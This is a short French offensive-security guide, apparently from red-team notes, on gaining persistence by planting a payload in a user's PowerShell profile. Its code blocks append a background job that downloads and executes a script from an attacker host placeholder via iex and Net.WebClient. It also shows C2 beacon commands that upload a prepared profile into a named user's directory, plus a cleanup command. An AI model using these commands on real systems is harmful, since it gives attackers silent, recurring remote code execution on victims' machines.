Un profil PowerShell (`profile.ps1`) est un script qui s'exécute au démarrage de chaque nouvelle session PowerShell. Les administrateurs et développeurs les utilisent légitimement pour personnaliser leur environnement (alias, fonctions, etc.). Un attaquant peut créer ou modifier ce fichier pour y exécuter son propre code. 

Les emplacements des profils peuvent être trouvés via la variable `$PROFILE` dans PowerShell :

- **Pour l'utilisateur courant, hôte actuel :** `$PROFILE.CurrentUserCurrentHost` (ou `$PROFILE`)
    
- **Pour tous les utilisateurs, hôte actuel :** `$PROFILE.AllUsersCurrentHost`
    

### Implémentation

Si le répertoire ou le fichier de profil n'existe pas, il suffit de les créer.

```
# 1. Vérifier si le fichier de profil existe
Test-Path $PROFILE

# 2. Si le répertoire parent n'existe pas, le créer
if (-not (Test-Path (Split-Path $PROFILE))) {
    New-Item -Type Directory -Path (Split-Path $PROFILE) -Force
}

# 3. Créer le contenu du payload.
# Note importante : Le code ne doit pas être bloquant, sinon la console PowerShell de l'utilisateur ne s'ouvrira jamais.
# On utilise Start-Job pour lancer le payload en tâche de fond.
$Payload = 'Start-Job -ScriptBlock { iex(New-Object Net.WebClient).DownloadString("http://<IP_ATTAQUANT>/payload.ps1") }'

# 4. Ajouter le payload au fichier de profil
Add-Content -Path $PROFILE -Value $Payload
```

**Exemple avec un C2 :**

```
// Créer le répertoire s'il n'existe pas
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell

// Se positionner dans le répertoire
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell

// Téléverser le fichier profile.ps1 préparé par l'attaquant
beacon> upload C:\Payloads\Profile.ps1
```

### Nettoyage

```
# Supprimer le fichier de profil
Remove-Item -Path $PROFILE -Force
```